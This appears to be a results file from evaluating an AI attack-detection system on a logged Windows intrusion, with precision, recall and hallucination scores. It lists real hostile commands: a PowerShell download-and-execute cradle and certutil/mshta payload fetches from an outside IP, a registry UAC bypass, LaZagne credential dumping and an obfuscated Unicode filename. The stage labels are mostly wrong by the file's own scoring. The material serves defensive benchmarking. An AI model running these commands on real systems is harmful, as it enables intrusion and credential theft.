@@ -1,0 +1,104 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\u065f\u0587\u202b\u202e\u202d\u202c\u200f\ufeff\u2066\u2067\u2068\u2069\ufeff\u064f\u061c\u060c\u0629\u063a\u0640\u06dd\ub800\ub801\ub802\ub803\ub804\ub805\\B.ps1",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-atomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"{New-Item \\\"hkcu:\\software\\classes\\ms-setting\\shell\\open\\command\\\" -Force New-ItemProperty \\\"hkcu:\\software\\classes\\ms-setting\\shell\\open\\command\\\" -Name \\\"delegateexecute\\\" -Value \\\"\\\" -Force Set-itemproperty \\\"hkcu:\\software\\classes\\ms-setting\\shell\\open\\command\\\" -Name \\\"(default)\\\" -value \\\"c:\\windows\\system32\\cmd.exe\\\" -force start-process \\\"c:\\windows\\system32\\\\computerdefaults.exe\\\"}\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"start-process c:\\windows\\system32\\\\computerdefaults.exe\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \\\"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system\\\" /VE /D \\\"c:\\windows\\system32\\\\cmd.exe\\\" /f\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system\" /VE /D \"c:\\windows\\system32\\\\cmd.exe\" /f",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \" Lazagne1.exe browsers ",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system\" /v verifierdlls /d 1 /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system\" /v verifierdlls /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/test.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/t1218.005.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"invoke-webrequest http://124.223.85.207:8082/test.hta -method post -usebasicparsing -contenttype application/json \u201e, ",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The attacker is attempting to establish persistence and escalate privileges through various means such as registry modifications and exploiting system vulnerabilities.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 73271,
+      "completion_tokens": 1855,
+      "total_tokens": 75126,
+      "wall_clock_s": 68.883,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.23076923076923078,
+      "recall": 0.2,
+      "f1": 0.21428571428571427,
+      "tp": 3,
+      "fp": 10,
+      "fn": 12
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 13,
+      "fn": 14,
+      "recall_partial": 0.07142857142857142
+    },
+    "hallucination_rate": 0.3333333333333333,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 73271,
+      "completion_tokens": 1855,
+      "total_tokens": 75126,
+      "wall_clock_s": 68.883,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
